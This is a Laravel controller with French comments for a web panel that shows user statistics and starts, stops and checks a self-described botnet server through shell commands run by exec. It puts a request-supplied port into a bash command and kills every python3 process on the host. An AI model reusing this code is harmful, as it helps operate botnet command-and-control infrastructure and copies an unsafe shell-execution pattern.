<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Network;
use Illuminate\Support\Facades\DB;

class HomeController extends Controller
{




    public function index()
    {
        $username = auth()->user()->prenom;
        $name = auth()->user()->nom;

        // Récupérer le nombre d'utilisateurs inscrits par mois
        $userCounts = User::select(DB::raw("COUNT(*) as count, MONTH(created_at) as month"))
            ->groupBy(DB::raw("MONTH(created_at)"))
            ->get();

        // Initialiser des tableaux pour stocker les données du graphique
        $months = [];
        $userRegistrationCounts = [];

        // Remplir les tableaux avec les données récupérées
        foreach ($userCounts as $userCount) {
            $months[] = \DateTime::createFromFormat('!m', $userCount->month)->format('F');
            $userRegistrationCounts[] = $userCount->count;
        }

        // Récupérer le nombre de groupes créés
        $networkCount = Network::count();


        
        $nomProcessus = "python3";

        // Exécuter la commande pgrep pour rechercher le processus par nom
        // Utilisation de -c pour compter le nombre de processus correspondants
        // Utilisation de -f pour rechercher dans toute la ligne de commande
        $commande = "pgrep -c -f \"$nomProcessus\"";
        $resultat = exec($commande);

        // Convertir le résultat en nombre entier
        $nombreProcessus = intval($resultat);

        // Vérifier si le processus est actif
        if ($nombreProcessus > 2) {
            $status_botnet = true;
        } else {
            $status_botnet = false;
        }


        return view('home', [
            'username' => $username,
            'name' => $name,
            'months' => json_encode($months), // Convertir en format JSON pour le script du graphique
            'userRegistrationCounts' => json_encode($userRegistrationCounts),
            'networkCount' => $networkCount,
        ])->with('botnet_status', $status_botnet);
    }


    public function aide_botnet()
    {

    
            // Exécute la commande ipconfig et récupère le résultat dans $output
            exec('/home/debian/PA-BOTNET-PYSRV/venv/bin/python /home/debian/PA-BOTNET-PYSRV/main.py --help', $output, $return);
            // Convertit le tableau $output en une chaîne de caractères
            $outputString = implode("\n", $output);
        
            
            return redirect('/home')->with('output', $outputString);
        
    }



    public function start_botnet(Request $request)
    {
        // Récupérer le port du formulaire
        $port = $request->input('port');
    
        // Validation basique pour s'assurer que le port est un entier et dans la plage adéquate
        if (!is_numeric($port) || $port < 1023 || $port > 65535) {
            return redirect('/home')->with('output', "Port invalide. Choisissez un port entre 1023 et 65535.");
        }
    
        // Commande pour activer l'environnement virtuel et démarrer le serveur Python avec le port spécifié
        $command = "bash -c 'nohup source /home/debian/PA-BOTNET-PYSRV/venv/bin/activate && nohup python3 /home/debian/PA-BOTNET-PYSRV/main.py --start --port $port > /dev/null 2>&1 & echo $!'";

    
        exec($command, $output, $return);
    
        // Le PID du processus lancé
        $pid = $output[0];
    
        return redirect('/home')->with('output', "Processus démarré avec le PID $pid sur le port $port");
    }
    

    public function stop_botnet()
    {
        $command = 'killall python3';
        exec($command, $output, $return);
        
        return redirect('/home')->with('output', "Processus arrêté avec le PID");
    }

}
